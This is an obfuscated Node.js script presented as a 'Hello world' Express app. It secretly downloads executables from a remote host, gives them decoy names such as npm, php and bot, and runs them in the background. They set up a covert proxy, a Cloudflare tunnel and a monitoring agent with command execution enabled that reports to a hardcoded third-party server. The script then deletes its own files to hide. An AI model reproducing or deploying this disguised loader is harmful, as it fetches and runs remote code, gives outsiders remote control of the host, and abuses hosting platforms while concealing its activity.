const _0x4dda0a=_0x1f9c;function _0x114f(){const _0x2bb708=['filter','2096','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/trojan-argo','Vls','quic','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','NEZHA_SERVER','/dev/null','ARGO_PORT','axios','ArgoDomain:','NAME','2399796aPrPHI','readFileSync','FILE_PATH','&path=%2Fvless-argo%3Fed%3D2560#','trojan','trim','php\x20is\x20running','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','SERVER_PORT','xtls-rprx-vision','match','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-p\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','length','toString','https://arm64.ssss.nyc.mn/agent','chmod','npm','5719424FWUtas','https://amd64.ssss.nyc.mn/v1','application/json','send','close','message','unshift','post','1427034TFsznA','CFPORT','http','aarch64','stringify','&type=ws&host=','Download\x20','260572mwmPGl','nxABw6y9GnVpW3o17Ws5jzWFhFk8M6EB','vmess','/vmess-argo?ed=2560','sub.txt','2083','/api/add-subscriptions','/web\x20-c\x20','9afd1299-b893-40c1-84dd-51e7cm204913','\x0a\x20\x20credentials-file:\x20','php\x20running\x20error:\x20','split','Error\x20executing\x20command:\x20','sub','https://arm64.ssss.nyc.mn/v1','unlinkSync','2150005PXvfUF','includes','?security=tls&sni=','false','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Skipping\x20adding\x20automatic\x20access\x20task','./bot','3YKifiR','express','tls','\x20>/dev/null\x202>&1\x20&','arm64','\x0a\x20\x20\x0atrojan://','createWriteStream','has','join','Error\x20downloading\x20files:','boot.log','child_process','nohup\x20','/vmess-argo','TunnelSecret','NEZHA_KEY','https://amd64.ssss.nyc.mn/agent','agent.vip.pp.ua:80','arm','status','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','bot','2053','eyJhIjoiODAxNmU2NTkyZGUzZmFlMjMyNTlmODU2NzM0ZjljNDYiLCJ0IjoiZDU5OTczYjEtYTBhNC00ZTZjLTg2YTMtOGY0MDdmZjZjMTk2IiwicyI6Ik9ETTBaR0prT1RRdE9HSmhNaTAwTW1NM0xUbG1ZVEl0TVdObU5HTTBNV1kzWWpGbCJ9','?encryption=none&security=tls&sni=','blackhole','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','catch','329283pQVIFP','\x20failed:\x20','error','then','set','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','127.0.0.1','2087','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','get','www.visa.com.sg','Error\x20reading\x20boot.log:','--tls','unlink','fileName','log','test','/api/delete-nodes','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Subscription\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','tunnel.json','push','forEach','8443','base64','env','clear','from','ARGO_DOMAIN:','galaxy.danaizi.eu.org','listen','util','config.json','automatic\x20access\x20task\x20added\x20successfully','Hello\x20world!','/config.json\x20>/dev/null\x202>&1\x20&','data','existsSync','PORT','\x0a\x20\x20\x20\x20','response','443','mkdirSync','tcp','./web','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x0avmess://','UPLOAD_URL','\x0aclient_secret:\x20','bot\x20is\x20running','vless','freedom','ARGO_AUTH','exec','all','rm\x20-rf\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','707258TbMeGw','tunnel.yml','NEZHA\x20variable\x20is\x20empty,skip\x20running','web','writeFileSync','/npm\x20-s\x20','/api/add-nodes','AUTO_ACCESS','php','https://oooo.serv00.net/add-url','Empowerment\x20failed\x20for\x20','none','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','true','config.yaml','utf-8','bot\x20is\x20running.'];_0x114f=function(){return _0x2bb708;};return _0x114f();}function _0x1f9c(_0xddba6b,_0x3768fb){const _0x114fbf=_0x114f();return _0x1f9c=function(_0x1f9ce6,_0x581d23){_0x1f9ce6=_0x1f9ce6-0x133;let _0x393158=_0x114fbf[_0x1f9ce6];return _0x393158;},_0x1f9c(_0xddba6b,_0x3768fb);}(function(_0x5aed05,_0x335717){const _0x271e94=_0x1f9c,_0x3f7f86=_0x5aed05();while(!![]){try{const _0x298397=-parseInt(_0x271e94(0x1aa))/0x1+parseInt(_0x271e94(0x134))/0x2*(-parseInt(_0x271e94(0x18e))/0x3)+parseInt(_0x271e94(0x177))/0x4+-parseInt(_0x271e94(0x187))/0x5+parseInt(_0x271e94(0x170))/0x6+parseInt(_0x271e94(0x154))/0x7+parseInt(_0x271e94(0x168))/0x8;if(_0x298397===_0x335717)break;else _0x3f7f86['push'](_0x3f7f86['shift']());}catch(_0x1e79a5){_0x3f7f86['push'](_0x3f7f86['shift']());}}}(_0x114f,0x3c811));const express=require(_0x4dda0a(0x18f)),app=express(),axios=require(_0x4dda0a(0x151)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4dda0a(0x1ca)),exec=promisify(require(_0x4dda0a(0x199))[_0x4dda0a(0x1e0)]),{execSync}=require(_0x4dda0a(0x199)),UPLOAD_URL=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x1da)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x13b)]||![],FILE_PATH=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x156)]||'./tmp',SUB_PATH=process[_0x4dda0a(0x1c4)]['SUB_PATH']||_0x4dda0a(0x184),PORT=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x15d)]||process[_0x4dda0a(0x1c4)][_0x4dda0a(0x1d1)]||0xbb8,UUID=process[_0x4dda0a(0x1c4)]['UUID']||_0x4dda0a(0x17f),NEZHA_SERVER=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x14e)]||_0x4dda0a(0x19f),NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4dda0a(0x19d)]||_0x4dda0a(0x178),ARGO_DOMAIN=process[_0x4dda0a(0x1c4)]['ARGO_DOMAIN']||_0x4dda0a(0x1c8),ARGO_AUTH=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x1df)]||_0x4dda0a(0x1a5),ARGO_PORT=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x150)]||0x1f41,CFIP=process['env']['CFIP']||_0x4dda0a(0x1b4),CFPORT=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x171)]||0x1bb,NAME=process[_0x4dda0a(0x1c4)][_0x4dda0a(0x153)]||_0x4dda0a(0x14a);!fs[_0x4dda0a(0x1d0)](FILE_PATH)?(fs[_0x4dda0a(0x1d5)](FILE_PATH),console[_0x4dda0a(0x1b9)](FILE_PATH+'\x20is\x20created')):console[_0x4dda0a(0x1b9)](FILE_PATH+'\x20already\x20exists');let npmPath=path['join'](FILE_PATH,'npm'),phpPath=path[_0x4dda0a(0x196)](FILE_PATH,_0x4dda0a(0x13c)),webPath=path[_0x4dda0a(0x196)](FILE_PATH,'web'),botPath=path[_0x4dda0a(0x196)](FILE_PATH,'bot'),subPath=path[_0x4dda0a(0x196)](FILE_PATH,_0x4dda0a(0x17b)),listPath=path[_0x4dda0a(0x196)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4dda0a(0x196)](FILE_PATH,_0x4dda0a(0x198)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x4dba8b=_0x4dda0a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x44b899;try{_0x44b899=fs[_0x4dba8b(0x155)](subPath,'utf-8');}catch{return null;}const _0x503efe=Buffer[_0x4dba8b(0x1c6)](_0x44b899,'base64')[_0x4dba8b(0x164)]('utf-8'),_0xffd860=_0x503efe[_0x4dba8b(0x182)]('\x0a')['filter'](_0x388897=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4dba8b(0x1ba)](_0x388897));if(_0xffd860[_0x4dba8b(0x163)]===0x0)return;return axios[_0x4dba8b(0x16f)](UPLOAD_URL+_0x4dba8b(0x1bb),JSON[_0x4dba8b(0x174)]({'nodes':_0xffd860}),{'headers':{'Content-Type':_0x4dba8b(0x16a)}})[_0x4dba8b(0x1a9)](_0x529953=>{return null;});}catch(_0x24b301){return null;}}function cleanupOldFiles(){const _0x5355fc=_0x4dda0a,_0x323a21=['web',_0x5355fc(0x1a3),_0x5355fc(0x167),_0x5355fc(0x13c),_0x5355fc(0x17b),'boot.log'];_0x323a21[_0x5355fc(0x1c1)](_0x2bca9b=>{const _0x257d7c=_0x5355fc,_0x1dcf8c=path[_0x257d7c(0x196)](FILE_PATH,_0x2bca9b);fs[_0x257d7c(0x1b7)](_0x1dcf8c,()=>{});});}app[_0x4dda0a(0x1b3)]('/',function(_0x41ea2e,_0x46a7db){const _0x42b03d=_0x4dda0a;_0x46a7db[_0x42b03d(0x16b)](_0x42b03d(0x1cd));});const config={'log':{'access':_0x4dda0a(0x14f),'error':_0x4dda0a(0x14f),'loglevel':_0x4dda0a(0x13f)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4dda0a(0x15e)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x4dda0a(0x19b),'dest':0xbbb},{'path':_0x4dda0a(0x149),'dest':0xbbc}]},'streamSettings':{'network':_0x4dda0a(0x1d6)}},{'port':0xbb9,'listen':_0x4dda0a(0x1b0),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4dda0a(0x13f)},'streamSettings':{'network':_0x4dda0a(0x1d6),'security':_0x4dda0a(0x13f)}},{'port':0xbba,'listen':_0x4dda0a(0x1b0),'protocol':_0x4dda0a(0x1dd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4dda0a(0x13f)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4dda0a(0x172),_0x4dda0a(0x190),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4dda0a(0x179),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4dda0a(0x172),_0x4dda0a(0x190),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4dda0a(0x1b0),'protocol':_0x4dda0a(0x158),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4dda0a(0x13f),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4dda0a(0x172),'tls',_0x4dda0a(0x14b)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4dda0a(0x1de),'tag':'direct'},{'protocol':_0x4dda0a(0x1a7),'tag':'block'}]};fs[_0x4dda0a(0x138)](path[_0x4dda0a(0x196)](FILE_PATH,_0x4dda0a(0x1cb)),JSON[_0x4dda0a(0x174)](config,null,0x2));function getSystemArchitecture(){const _0xd56a3f=_0x4dda0a,_0x358bbf=os['arch']();return _0x358bbf==='arm'||_0x358bbf===_0xd56a3f(0x192)||_0x358bbf===_0xd56a3f(0x173)?_0xd56a3f(0x1a0):'amd';}function downloadFile(_0x308916,_0x26a1e1,_0x4991a7){const _0x553d9f=_0x4dda0a,_0x341d22=path[_0x553d9f(0x196)](FILE_PATH,_0x308916),_0x5305ce=fs[_0x553d9f(0x194)](_0x341d22);axios({'method':_0x553d9f(0x1b3),'url':_0x26a1e1,'responseType':'stream'})[_0x553d9f(0x1ad)](_0x22fa68=>{const _0x47d297=_0x553d9f;_0x22fa68[_0x47d297(0x1cf)]['pipe'](_0x5305ce),_0x5305ce['on']('finish',()=>{const _0x322f5f=_0x47d297;_0x5305ce[_0x322f5f(0x16c)](),console[_0x322f5f(0x1b9)](_0x322f5f(0x176)+_0x308916+'\x20successfully'),_0x4991a7(null,_0x308916);}),_0x5305ce['on']('error',_0x13cc99=>{const _0x2e7faf=_0x47d297;fs[_0x2e7faf(0x1b7)](_0x341d22,()=>{});const _0x250819=_0x2e7faf(0x176)+_0x308916+_0x2e7faf(0x1ab)+_0x13cc99[_0x2e7faf(0x16d)];console['error'](_0x250819),_0x4991a7(_0x250819);});})['catch'](_0x5a0c6f=>{const _0x1eea9f=_0x553d9f,_0x3bbd37='Download\x20'+_0x308916+_0x1eea9f(0x1ab)+_0x5a0c6f[_0x1eea9f(0x16d)];console[_0x1eea9f(0x1ac)](_0x3bbd37),_0x4991a7(_0x3bbd37);});}async function downloadFilesAndRun(){const _0x2d08e6=_0x4dda0a,_0x534d37=getSystemArchitecture(),_0x3fec94=getFilesForArchitecture(_0x534d37);if(_0x3fec94[_0x2d08e6(0x163)]===0x0){console[_0x2d08e6(0x1b9)](_0x2d08e6(0x162));return;}const _0x3f90eb=_0x3fec94['map'](_0x372c83=>{return new Promise((_0x3d6874,_0x4b2764)=>{const _0x3e90b6=_0x1f9c;downloadFile(_0x372c83[_0x3e90b6(0x1b8)],_0x372c83['fileUrl'],(_0x37f215,_0x35afef)=>{_0x37f215?_0x4b2764(_0x37f215):_0x3d6874(_0x35afef);});});});try{await Promise[_0x2d08e6(0x1e1)](_0x3f90eb);}catch(_0xe34475){console[_0x2d08e6(0x1ac)](_0x2d08e6(0x197),_0xe34475);return;}function _0xad5a44(_0x5ed604){const _0x212bb4=_0x2d08e6,_0x1eae67=0x1fd;_0x5ed604[_0x212bb4(0x1c1)](_0xa09b59=>{const _0x5beb8e=_0x212bb4,_0x2bbd8c=path[_0x5beb8e(0x196)](FILE_PATH,_0xa09b59);fs[_0x5beb8e(0x1d0)](_0x2bbd8c)&&fs[_0x5beb8e(0x166)](_0x2bbd8c,_0x1eae67,_0x3aaf09=>{const _0x3c75f7=_0x5beb8e;_0x3aaf09?console[_0x3c75f7(0x1ac)](_0x3c75f7(0x13e)+_0x2bbd8c+':\x20'+_0x3aaf09):console['log']('Empowerment\x20success\x20for\x20'+_0x2bbd8c+':\x20'+_0x1eae67[_0x3c75f7(0x164)](0x8));});});}const _0x20f116=NEZHA_PORT?['./npm','./web',_0x2d08e6(0x18d)]:['./php',_0x2d08e6(0x1d7),_0x2d08e6(0x18d)];_0xad5a44(_0x20f116);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x293e41=NEZHA_SERVER[_0x2d08e6(0x188)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x5d1b30=new Set([_0x2d08e6(0x1d4),_0x2d08e6(0x1c2),_0x2d08e6(0x146),_0x2d08e6(0x1b1),_0x2d08e6(0x17c),'2053']),_0x138fa3=_0x5d1b30[_0x2d08e6(0x195)](_0x293e41)?_0x2d08e6(0x141):_0x2d08e6(0x18a),_0x3f57b6=_0x2d08e6(0x1db)+NEZHA_KEY+_0x2d08e6(0x1a8)+NEZHA_SERVER+_0x2d08e6(0x1b2)+_0x138fa3+_0x2d08e6(0x140)+UUID;fs[_0x2d08e6(0x138)](path[_0x2d08e6(0x196)](FILE_PATH,_0x2d08e6(0x142)),_0x3f57b6);const _0x2a62c9=_0x2d08e6(0x19a)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x2d08e6(0x18b);try{await exec(_0x2a62c9),console[_0x2d08e6(0x1b9)](_0x2d08e6(0x15a)),await new Promise(_0xc0acd3=>setTimeout(_0xc0acd3,0x3e8));}catch(_0x1d2859){console[_0x2d08e6(0x1ac)](_0x2d08e6(0x181)+_0x1d2859);}}else{let _0x353153='';const _0x4a8dbe=[_0x2d08e6(0x1d4),_0x2d08e6(0x1c2),_0x2d08e6(0x146),_0x2d08e6(0x1b1),_0x2d08e6(0x17c),_0x2d08e6(0x1a4)];_0x4a8dbe[_0x2d08e6(0x188)](NEZHA_PORT)&&(_0x353153=_0x2d08e6(0x1b6));const _0x38344d='nohup\x20'+FILE_PATH+_0x2d08e6(0x139)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d08e6(0x161)+NEZHA_KEY+'\x20'+_0x353153+_0x2d08e6(0x191);try{await exec(_0x38344d),console[_0x2d08e6(0x1b9)]('npm\x20is\x20running'),await new Promise(_0x557c10=>setTimeout(_0x557c10,0x3e8));}catch(_0x213748){console['error']('npm\x20running\x20error:\x20'+_0x213748);}}}else console['log'](_0x2d08e6(0x136));const _0x12c93f=_0x2d08e6(0x19a)+FILE_PATH+_0x2d08e6(0x17e)+FILE_PATH+_0x2d08e6(0x1ce);try{await exec(_0x12c93f),console[_0x2d08e6(0x1b9)]('web\x20is\x20running'),await new Promise(_0x3ec011=>setTimeout(_0x3ec011,0x3e8));}catch(_0x1ffbc7){console[_0x2d08e6(0x1ac)]('web\x20running\x20error:\x20'+_0x1ffbc7);}if(fs[_0x2d08e6(0x1d0)](path[_0x2d08e6(0x196)](FILE_PATH,_0x2d08e6(0x1a3)))){let _0x50f572;if(ARGO_AUTH[_0x2d08e6(0x15f)](/^[A-Z0-9a-z=]{120,250}$/))_0x50f572=_0x2d08e6(0x15c)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x50f572=_0x2d08e6(0x14d)+FILE_PATH+'/tunnel.yml\x20run':_0x50f572='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2d08e6(0x147)+ARGO_PORT;try{await exec(_0x2d08e6(0x19a)+FILE_PATH+'/bot\x20'+_0x50f572+_0x2d08e6(0x191)),console[_0x2d08e6(0x1b9)](_0x2d08e6(0x1dc)),await new Promise(_0x12743=>setTimeout(_0x12743,0x7d0));}catch(_0x5b0129){console['error'](_0x2d08e6(0x183)+_0x5b0129);}}await new Promise(_0x23b402=>setTimeout(_0x23b402,0x1388));}function getFilesForArchitecture(_0xf070e5){const _0x5f0f20=_0x4dda0a;let _0x1eb9ce;_0xf070e5===_0x5f0f20(0x1a0)?_0x1eb9ce=[{'fileName':'web','fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x5f0f20(0x1a3),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x1eb9ce=[{'fileName':_0x5f0f20(0x137),'fileUrl':_0x5f0f20(0x14c)},{'fileName':'bot','fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x42279d=_0xf070e5===_0x5f0f20(0x1a0)?_0x5f0f20(0x165):_0x5f0f20(0x19e);_0x1eb9ce['unshift']({'fileName':'npm','fileUrl':_0x42279d});}else{const _0x32b2f5=_0xf070e5===_0x5f0f20(0x1a0)?_0x5f0f20(0x185):_0x5f0f20(0x169);_0x1eb9ce[_0x5f0f20(0x16e)]({'fileName':_0x5f0f20(0x13c),'fileUrl':_0x32b2f5});}}return _0x1eb9ce;}function argoType(){const _0x467646=_0x4dda0a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x467646(0x1b9)](_0x467646(0x133));return;}if(ARGO_AUTH[_0x467646(0x188)](_0x467646(0x19c))){fs[_0x467646(0x138)](path['join'](FILE_PATH,_0x467646(0x1bf)),ARGO_AUTH);const _0x3f4315=_0x467646(0x1d8)+ARGO_AUTH[_0x467646(0x182)]('\x22')[0xb]+_0x467646(0x180)+path[_0x467646(0x196)](FILE_PATH,'tunnel.json')+_0x467646(0x15b)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x467646(0x138)](path[_0x467646(0x196)](FILE_PATH,_0x467646(0x135)),_0x3f4315);}else console[_0x467646(0x1b9)](_0x467646(0x1bc));}argoType();async function extractDomains(){const _0x6e8b85=_0x4dda0a;let _0xe09b2e;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe09b2e=ARGO_DOMAIN,console[_0x6e8b85(0x1b9)](_0x6e8b85(0x1c7),_0xe09b2e),await _0x2cad5e(_0xe09b2e);else try{const _0x3114c6=fs[_0x6e8b85(0x155)](path[_0x6e8b85(0x196)](FILE_PATH,_0x6e8b85(0x198)),'utf-8'),_0x489f4b=_0x3114c6['split']('\x0a'),_0x4c128c=[];_0x489f4b[_0x6e8b85(0x1c1)](_0x4cd2eb=>{const _0x2bbfc5=_0x6e8b85,_0x47696c=_0x4cd2eb[_0x2bbfc5(0x15f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x47696c){const _0x474cf7=_0x47696c[0x1];_0x4c128c[_0x2bbfc5(0x1c0)](_0x474cf7);}});if(_0x4c128c[_0x6e8b85(0x163)]>0x0)_0xe09b2e=_0x4c128c[0x0],console[_0x6e8b85(0x1b9)](_0x6e8b85(0x152),_0xe09b2e),await _0x2cad5e(_0xe09b2e);else{console['log'](_0x6e8b85(0x160)),fs[_0x6e8b85(0x186)](path[_0x6e8b85(0x196)](FILE_PATH,_0x6e8b85(0x198)));async function _0x2ecaa8(){const _0x39cc75=_0x6e8b85;try{await exec(_0x39cc75(0x1af));}catch(_0x3ad613){}}_0x2ecaa8(),await new Promise(_0x3aa167=>setTimeout(_0x3aa167,0xbb8));const _0x4aeaca=_0x6e8b85(0x148)+FILE_PATH+_0x6e8b85(0x147)+ARGO_PORT;try{await exec(_0x6e8b85(0x19a)+path['join'](FILE_PATH,_0x6e8b85(0x1a3))+'\x20'+_0x4aeaca+_0x6e8b85(0x191)),console[_0x6e8b85(0x1b9)](_0x6e8b85(0x144)),await new Promise(_0x16fd70=>setTimeout(_0x16fd70,0xbb8)),await extractDomains();}catch(_0x4f2eec){console['error'](_0x6e8b85(0x183)+_0x4f2eec);}}}catch(_0xe7787b){console['error'](_0x6e8b85(0x1b5),_0xe7787b);}async function _0x2cad5e(_0x539206){const _0x337883=_0x6e8b85,_0x3241ae=execSync(_0x337883(0x1a2),{'encoding':_0x337883(0x143)}),_0x3394d3=_0x3241ae[_0x337883(0x159)]();return new Promise(_0x1d5428=>{setTimeout(()=>{const _0x5c50d8=_0x1f9c,_0x1ac8cc={'v':'2','ps':NAME+'-'+_0x3394d3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5c50d8(0x13f),'net':'ws','type':_0x5c50d8(0x13f),'host':_0x539206,'path':_0x5c50d8(0x17a),'tls':_0x5c50d8(0x190),'sni':_0x539206,'alpn':''},_0x48c328='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5c50d8(0x1a6)+_0x539206+_0x5c50d8(0x175)+_0x539206+_0x5c50d8(0x157)+NAME+'-'+_0x3394d3+_0x5c50d8(0x1d9)+Buffer[_0x5c50d8(0x1c6)](JSON['stringify'](_0x1ac8cc))[_0x5c50d8(0x164)](_0x5c50d8(0x1c3))+_0x5c50d8(0x193)+UUID+'@'+CFIP+':'+CFPORT+_0x5c50d8(0x189)+_0x539206+_0x5c50d8(0x175)+_0x539206+_0x5c50d8(0x1e3)+NAME+'-'+_0x3394d3+_0x5c50d8(0x1d2);console['log'](Buffer[_0x5c50d8(0x1c6)](_0x48c328)[_0x5c50d8(0x164)](_0x5c50d8(0x1c3))),fs[_0x5c50d8(0x138)](subPath,Buffer[_0x5c50d8(0x1c6)](_0x48c328)[_0x5c50d8(0x164)]('base64')),console[_0x5c50d8(0x1b9)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x5c50d8(0x1b3)]('/'+SUB_PATH,(_0xb05eb7,_0x487205)=>{const _0x4c1600=_0x5c50d8,_0x17654e=Buffer[_0x4c1600(0x1c6)](_0x48c328)[_0x4c1600(0x164)](_0x4c1600(0x1c3));_0x487205[_0x4c1600(0x1ae)]('Content-Type','text/plain;\x20charset=utf-8'),_0x487205['send'](_0x17654e);}),_0x1d5428(_0x48c328);},0x7d0);});}}async function uplodNodes(){const _0x42f192=_0x4dda0a;if(UPLOAD_URL&&PROJECT_URL){const _0x4547c0=PROJECT_URL+'/'+SUB_PATH,_0xece81b={'subscription':[_0x4547c0]};try{const _0x136143=await axios[_0x42f192(0x16f)](UPLOAD_URL+_0x42f192(0x17d),_0xece81b,{'headers':{'Content-Type':'application/json'}});if(_0x136143['status']===0xc8)console[_0x42f192(0x1b9)](_0x42f192(0x1bd));else return null;}catch(_0x2e72ff){if(_0x2e72ff[_0x42f192(0x1d3)]){if(_0x2e72ff['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x42f192(0x1d0)](listPath))return;const _0x4ac74a=fs[_0x42f192(0x155)](listPath,_0x42f192(0x143)),_0x38de5e=_0x4ac74a[_0x42f192(0x182)]('\x0a')[_0x42f192(0x145)](_0x4260b8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x42f192(0x1ba)](_0x4260b8));if(_0x38de5e[_0x42f192(0x163)]===0x0)return;const _0x339f53=JSON[_0x42f192(0x174)]({'nodes':_0x38de5e});try{await axios[_0x42f192(0x16f)](UPLOAD_URL+_0x42f192(0x13a),_0x339f53,{'headers':{'Content-Type':_0x42f192(0x16a)}});if(response[_0x42f192(0x1a1)]===0xc8)console[_0x42f192(0x1b9)](_0x42f192(0x1bd));else return null;}catch(_0x1fb2d1){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xe4b3c6=_0x1f9c,_0x346f85=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x346f85[_0xe4b3c6(0x1c0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x346f85['push'](phpPath);exec(_0xe4b3c6(0x1e2)+_0x346f85[_0xe4b3c6(0x196)]('\x20')+'\x20>/dev/null\x202>&1',_0x51bd09=>{const _0x3302e2=_0xe4b3c6;console[_0x3302e2(0x1c5)](),console[_0x3302e2(0x1b9)]('App\x20is\x20running'),console[_0x3302e2(0x1b9)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5ebd3e=_0x4dda0a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5ebd3e(0x1b9)](_0x5ebd3e(0x18c));return;}try{const _0xc1133b=await axios[_0x5ebd3e(0x16f)](_0x5ebd3e(0x13d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5ebd3e(0x16a)}});console[_0x5ebd3e(0x1b9)](_0x5ebd3e(0x1cc));}catch(_0x536475){console[_0x5ebd3e(0x1ac)]('添加URL失败:\x20'+_0x536475['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4dda0a(0x1c9)](PORT,()=>console[_0x4dda0a(0x1b9)](_0x4dda0a(0x1be)+PORT+'!'));
